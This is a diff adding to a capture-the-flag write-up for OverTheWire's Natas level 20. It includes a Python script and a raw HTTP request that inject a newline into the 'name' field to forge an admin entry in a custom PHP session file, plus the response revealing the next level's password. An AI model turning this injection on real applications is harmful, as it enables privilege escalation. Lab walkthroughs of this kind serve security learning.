@@ -2032,7 +2032,7 @@ Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
 </html>
 ```
 
-## Natas 19
+## Natas 20
 
 ### Credentials
 
@@ -2360,3 +2360,106 @@ DEBUG: MYWRITE brafbmkkbb2tmhhrn5m68r36n2 <br>DEBUG: Saving in /var/lib/php/sess
 ```
 
 The functions `myread` and `mywrite` need to be read carefully.
+
+The file is created in a first call, then read in the second. So we shall call the API twice, as in the following script:
+
+```python
+import base64
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')
+
+url = "http://natas20.natas.labs.overthewire.org/index.php?debug"
+
+
+def encode_cookie(cookie: str) -> str:
+    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
+    return encoded_cookie.decode('ascii')
+
+
+def send_request() -> str:
+    cookie = "PHPSESSID=" + "admin"
+    headers = {'Content-Type': 'application/x-www-form-urlencoded',
+               'Cookie': cookie}
+    body = "name=test\nadmin 1"
+    response = requests.post(url, headers=headers,
+                             auth=basic_auth, data=body, verify=False)
+    return response.text
+
+
+if __name__ == '__main__':
+    text = send_request()
+    text = send_request()
+    print(text)
+```
+
+This is equivalent to sending twice (eg. with Burp) the following POST request:
+
+```
+POST /index.php?debug HTTP/1.1
+Host: natas20.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+Origin: http://natas20.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyMDpwNW1DdlA3R1MySzZCbXQzZ3FoTTJGYzFBNVQ4TVZ5dw==
+Connection: keep-alive
+Referer: http://natas20.natas.labs.overthewire.org/index.php
+Cookie: PHPSESSID=969hrbu40iem1f32c61essr8ev
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+name=test
+admin 1
+```
+
+The second call gives the response:
+
+```
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 14:04:36 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1619
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
+<body>
+<h1>natas20</h1>
+<div id="content">
+DEBUG: MYREAD 969hrbu40iem1f32c61essr8ev<br>DEBUG: Reading from /var/lib/php/sessions/mysess_969hrbu40iem1f32c61essr8ev<br>DEBUG: Read [name test
+]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to test
+admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
+<form action="index.php" method="POST">
+Your name: <input name="name" value="test
+admin 1"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE 969hrbu40iem1f32c61essr8ev name|s:13:"test
+admin 1";admin|s:1:"1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_969hrbu40iem1f32c61essr8ev<br>DEBUG: admin => 1<br>DEBUG: name => test
+admin 1<br>
+```
